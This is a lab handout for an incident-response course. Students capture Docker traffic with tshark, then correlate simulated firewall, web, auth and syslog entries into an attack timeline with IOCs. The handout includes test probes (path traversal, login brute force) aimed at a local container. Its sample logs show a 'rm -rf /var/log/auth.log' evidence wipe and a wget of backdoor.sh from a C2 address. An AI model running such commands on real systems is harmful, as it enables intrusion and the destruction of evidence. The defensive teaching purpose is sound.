---
title: "Lab 11 — Incident Response: Detection, Triage & SIEM Analysis"
course: SCIA-472
week: 12
difficulty: "⭐⭐⭐"
estimated_time: "75–90 min"
tags:
  - incident-response
  - siem
  - tshark
  - log-correlation
  - nist-800-61
  - network-forensics
---

# Lab 11 — Incident Response: Detection, Triage & SIEM Analysis

| Field | Value |
|---|---|
| **Course** | SCIA-472 — Ethical Hacking & Penetration Testing |
| **Week** | 12 |
| **Difficulty** | ⭐⭐⭐ |
| **Estimated Time** | 75–90 minutes |
| **Prerequisites** | Labs 01–10 completed; Docker running |

## Overview

**NIST SP 800-61 Phase 2 — Detection & Analysis.** Students capture live network traffic with `tshark`, build a SIEM-style alert correlation engine, and triage a multi-source incident that simulates a real intrusion.

The core investigation question: **WHAT happened, WHEN did it happen, and HOW FAR did the attacker get?**

This lab covers:

- Network traffic capture and HTTP analysis with `tshark`
- Multi-source log review (firewall, web access, auth, syslog)
- SIEM-style event correlation and timeline reconstruction
- Incident IOC extraction
- NIST IR Kill Chain mapping

---

!!! warning "Ethical Use — Read Before Proceeding"
    All traffic captured in this lab originates from Docker containers you create and control. Never capture network traffic on networks you do not own or have explicit written authorization to monitor. Unauthorized packet capture may violate the Electronic Communications Privacy Act and equivalent statutes.

---

## Part 1 — Network Traffic Capture

### Step 1.1 — Set Up a Traffic Scenario

```bash
docker network create ir-lab
docker run -d --name web-server-ir --network ir-lab httpd:alpine
sleep 3
WEB_IP=$(docker inspect web-server-ir --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
echo "Web server IP: $WEB_IP"
```

!!! note "What's Running"
    You now have an Apache HTTP server container in an isolated Docker network. The web server IP is needed for subsequent steps.

---

### Step 1.2 — Capture Traffic with tshark

The following command starts a packet capture in a dedicated container, generates both normal and suspicious traffic, then analyzes the results.

```bash
# Start capture in background
docker run -d --name tshark-capture \
  --network ir-lab \
  --cap-add NET_RAW --cap-add NET_ADMIN \
  --security-opt seccomp=unconfined \
  ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq tshark 2>/dev/null
tshark -i eth0 -w /tmp/capture.pcap 2>/dev/null &
TSHARKPID=\$!
sleep 30
kill \$TSHARKPID 2>/dev/null"

sleep 3

# Generate traffic (normal + suspicious)
docker run --rm --network ir-lab curlimages/curl bash -c "
# Normal traffic
curl -s http://web-server-ir/ > /dev/null
curl -s http://web-server-ir/index.html > /dev/null
# Suspicious: directory traversal attempt
curl -s 'http://web-server-ir/../../../etc/passwd' > /dev/null
# Suspicious: admin login brute force
for i in 1 2 3 4 5; do
  curl -s -X POST http://web-server-ir/admin/login \
    -d \"username=admin&password=attempt\$i\" > /dev/null
done
# Suspicious: common backdoor paths
for path in /wp-admin /shell.php /.htaccess /backup.zip /phpmyadmin; do
  curl -s http://web-server-ir\$path > /dev/null
done
" 2>/dev/null || \
docker run --rm --network ir-lab nicolaka/netshoot bash -c "
wget -q http://web-server-ir/ -O /dev/null
wget -q 'http://web-server-ir/../etc/passwd' -O /dev/null 2>/dev/null || true"

sleep 5

# Analyze capture
docker exec tshark-capture bash -c "
tshark -r /tmp/capture.pcap -Y http 2>/dev/null | head -20 || \
tshark -r /tmp/capture.pcap 2>/dev/null | head -20"
```

📸 **Screenshot checkpoint 11a** — Capture the tshark analysis output showing captured HTTP traffic.

---

### Step 1.3 — HTTP Request Analysis

Analyze the captured requests to identify suspicious patterns: path traversal attempts, brute-force POST requests, and reconnaissance probes for common vulnerable paths.

```bash
docker exec tshark-capture bash -c "
echo '=== HTTP Requests ==='
tshark -r /tmp/capture.pcap -Y 'http.request' \
  -T fields -e http.request.method -e http.request.uri \
  2>/dev/null | sort | uniq -c | sort -rn | head -20"
```

!!! note "What to Look For"
    - Multiple `POST` requests to `/admin/login` → brute force indicator
    - `GET` requests containing `../` → directory traversal attempt
    - Probes for `/wp-admin`, `/phpmyadmin`, `/shell.php` → attacker reconnaissance

📸 **Screenshot checkpoint 11b** — Capture the HTTP request analysis output sorted by frequency.

---

## Part 2 — Log Correlation

Real incident response requires correlating events across multiple independent log sources. No single log tells the complete story.

### Step 2.1 — Multi-Source Incident Log

This simulates the four primary log sources an incident responder would collect.

```bash
docker run --rm python:3.11-slim python3 << 'PYEOF'
from datetime import datetime

# Simulated multi-source log data for incident analysis
logs = {
    'firewall.log': [
        '2026-04-18 09:45:00 ALLOW TCP 203.0.113.50:55123 -> 10.0.1.50:80',
        '2026-04-18 09:45:05 ALLOW TCP 203.0.113.50:55124 -> 10.0.1.50:80',
        '2026-04-18 09:45:10 ALLOW TCP 203.0.113.50:55125 -> 10.0.1.50:80',
        '2026-04-18 10:00:00 ALLOW TCP 203.0.113.50:60000 -> 10.0.1.50:22',
        '2026-04-18 10:00:01 ALLOW TCP 203.0.113.50:60001 -> 10.0.1.50:22',
    ],
    'web_access.log': [
        '203.0.113.50 - - [18/Apr/2026:09:45:00] "GET /login HTTP/1.1" 200',
        '203.0.113.50 - - [18/Apr/2026:09:45:05] "POST /login HTTP/1.1" 401',
        '203.0.113.50 - - [18/Apr/2026:09:45:06] "POST /login HTTP/1.1" 401',
        '203.0.113.50 - - [18/Apr/2026:09:45:07] "POST /login HTTP/1.1" 200',
        '203.0.113.50 - - [18/Apr/2026:09:46:00] "GET /admin/users HTTP/1.1" 200',
        '203.0.113.50 - - [18/Apr/2026:09:47:00] "GET /admin/export?file=../etc/passwd HTTP/1.1" 200',
    ],
    'auth.log': [
        '2026-04-18 10:00:01 sshd: Failed password for admin from 203.0.113.50',
        '2026-04-18 10:00:02 sshd: Failed password for admin from 203.0.113.50',
        '2026-04-18 10:00:03 sshd: Accepted password for admin from 203.0.113.50',
        '2026-04-18 10:01:00 sudo: admin : COMMAND=/bin/bash',
        '2026-04-18 10:02:00 sudo: admin : COMMAND=rm -rf /var/log/auth.log',
    ],
    'syslog': [
        '2026-04-18 10:01:30 kernel: iptables ACCEPT: TCP 203.0.113.50 -> 10.0.1.51:80',
        '2026-04-18 10:03:00 cron: (root) REPLACE (root)',
        '2026-04-18 10:03:01 cron: root: new cron job added',
        '2026-04-18 10:05:00 wget: downloading http://185.220.101.45/backdoor.sh',
    ],
}

for source, entries in logs.items():
    print(f'=== {source} ===')
    for entry in entries:
        print(f'  {entry}')
    print()
PYEOF
```

!!! danger "Key Observations"
    - Web log shows `POST /login` → `200` after two `401` responses: **brute-force success**
    - Web log shows `../etc/passwd` in URL: **path traversal exploitation**
    - auth.log shows SSH login then `sudo bash`: **privilege escalation**
    - auth.log shows `rm -rf /var/log/auth.log`: **evidence destruction**
    - syslog shows `wget http://185.220.101.45/backdoor.sh`: **malware download**

📸 **Screenshot checkpoint 11c** — Capture all four log sources displayed.

---

### Step 2.2 — SIEM-Style Correlation Engine

This script simulates what a SIEM does automatically: correlates events across sources by attacker IP and time to produce a unified incident timeline.

```bash
docker run --rm python:3.11-slim python3 << 'PYEOF'
import re
from collections import defaultdict

ATTACKER_IP = '203.0.113.50'
C2_IP = '185.220.101.45'

incident_timeline = [
    ('09:45:00', 'Web',  f'{ATTACKER_IP} begins login page enumeration'),
    ('09:45:05', 'Web',  f'{ATTACKER_IP} brute-forces login (3 attempts, success on 3rd)'),
    ('09:46:00', 'Web',  f'{ATTACKER_IP} accesses /admin/users - UNAUTHORIZED DATA ACCESS'),
    ('09:47:00', 'Web',  f'{ATTACKER_IP} exploits path traversal: ../etc/passwd'),
    ('10:00:01', 'Auth', f'{ATTACKER_IP} SSH brute-force (2 fails, 1 success)'),
    ('10:01:00', 'Auth', f'Attacker escalates to root via sudo bash'),
    ('10:02:00', 'Auth', f'Attacker DELETES auth.log - EVIDENCE DESTRUCTION'),
    ('10:03:01', 'Sys',  f'New cron job added - PERSISTENCE'),
    ('10:05:00', 'Sys',  f'Downloads backdoor from C2 {C2_IP} - MALWARE INSTALLATION'),
]

print('=== INCIDENT TIMELINE (CORRELATED FROM ALL SOURCES) ===')
print(f'Attacker IP: {ATTACKER_IP}')
print(f'C2 Server:   {C2_IP}')
print()
print(f'{"Time":<12} {"Source":<8} {"Event"}')
print('-' * 80)
for time, source, event in incident_timeline:
    print(f'{time:<12} {source:<8} {event}')

print()
print('=== KILL CHAIN MAPPING ===')
print('Reconnaissance: Login page enumeration')
print('Delivery:       Brute-force attack')
print('Exploitation:   Path traversal, privilege escalation')
print('Installation:   Backdoor download, cron persistence')
print('C2:             Backdoor beacon to', C2_IP)
print()
print('SEVERITY: CRITICAL - Full system compromise')
print('SCOPE: Web server + SSH access + root privileges obtained')
print('EVIDENCE DESTRUCTION: auth.log deleted - affects forensic investigation')
PYEOF
```

📸 **Screenshot checkpoint 11d** — Capture the full correlated incident timeline and Kill Chain mapping.

---

## Part 3 — Indicators of Compromise

### Step 3.1 — Extract IOCs from Incident

```bash
docker run --rm python:3.11-slim python3 -c "
iocs = {
    'Network': [
        '203.0.113.50 - Attacker IP (initial access)',
        '185.220.101.45:443 - C2 server (Tor exit node)',
        'http://185.220.101.45/backdoor.sh - Payload URL',
    ],
    'File': [
        '/tmp/backdoor.sh - Downloaded malware',
        'New cron entry in /var/spool/cron/crontabs/root',
    ],
    'Account': [
        'admin account - compromised via brute-force',
        'root - escalated to via sudo',
    ],
    'Evidence Destruction': [
        '/var/log/auth.log - DELETED by attacker',
        'Check backup of auth.log if centralized logging enabled',
    ],
}
print('=== INCIDENT IOCs ===')
for category, items in iocs.items():
    print(f'\n[{category}]')
    for item in items:
        print(f'  {item}')
"
```

📸 **Screenshot checkpoint 11e** — Capture the full IOC list.

---

## Cleanup

```bash
docker stop web-server-ir tshark-capture 2>/dev/null
docker rm web-server-ir tshark-capture 2>/dev/null
docker network rm ir-lab
docker system prune -f
```

---

## Assessment — Screenshot Checklist

Submit all five screenshots with your lab report. Each must clearly show terminal output.

| # | Screenshot ID | Required Content |
|---|---|---|
| 1 | **11a** | tshark capture output — HTTP traffic visible |
| 2 | **11b** | HTTP request analysis — POST brute-force, traversal paths, recon paths |
| 3 | **11c** | All four log sources — firewall, web, auth, syslog |
| 4 | **11d** | Correlated incident timeline — all 9 events + Kill Chain mapping |
| 5 | **11e** | IOC list — network, file, account, evidence destruction categories |

---

## NIST IR Phase Mapping

In your lab report, map each incident event to a NIST SP 800-61 phase:

| NIST Phase | Actions in This Incident | Controls That Would Help |
|---|---|---|
| **Preparation** | Deploy SIEM, centralize logs, enable SSH MFA | Centralized logging, MFA, WAF |
| **Detection & Analysis** | Correlate logs, identify attacker IP, build timeline | SIEM alert rules, anomaly detection |
| **Containment** | Block `203.0.113.50` at firewall, disable `admin` account | ACLs, account lockout |
| **Eradication** | Remove `/tmp/backdoor.sh`, delete malicious cron, reset credentials | FIM, cron monitoring |
| **Recovery** | Restore clean system image, verify integrity, re-enable services | Backups, change management |
| **Post-Incident** | Document timeline, improve brute-force detection rules | Lessons learned report |

---

## Reflection Questions

Answer each question in **150–200 words** in your lab report.

!!! question "Reflection 1 — Log Centralization"
    The attacker deleted `/var/log/auth.log` to cover their tracks. If a SIEM had been forwarding logs to a centralized server in real-time, what would be different for the investigation? Why is **log centralization** a critical security control?

!!! question "Reflection 2 — Log Correlation"
    The incident timeline was reconstructed by correlating firewall logs + web logs + auth logs + syslog. None of these sources alone told the complete story. What is **log correlation** and why is it essential for incident detection that would otherwise go unnoticed?

!!! question "Reflection 3 — Brute-Force Prevention"
    The attacker compromised the admin account by brute-forcing 3 SSH passwords — a trivially small number. What **two technical controls** would have prevented this entire incident chain from starting? Would MFA alone have been sufficient to stop the attack?

!!! question "Reflection 4 — NIST IR Firewall Timing"
    The attacker installed a backdoor by downloading `backdoor.sh` from a C2 server. At which point in the **NIST IR lifecycle** (Preparation, Detection, Containment, Eradication, Recovery) should the firewall rule blocking outbound connections to `185.220.101.45` be applied? Justify your answer with reference to the NIST framework.

---

!!! tip "Grading Rubric"
    | Component | Points |
    |---|---|
    | Screenshots (5 × 8 pts each) | 40 pts |
    | NIST IR phase mapping (complete table, all 6 phases) | 20 pts |
    | Reflection questions (4 × 10 pts each) | 40 pts |
    | **Total** | **100 pts** |
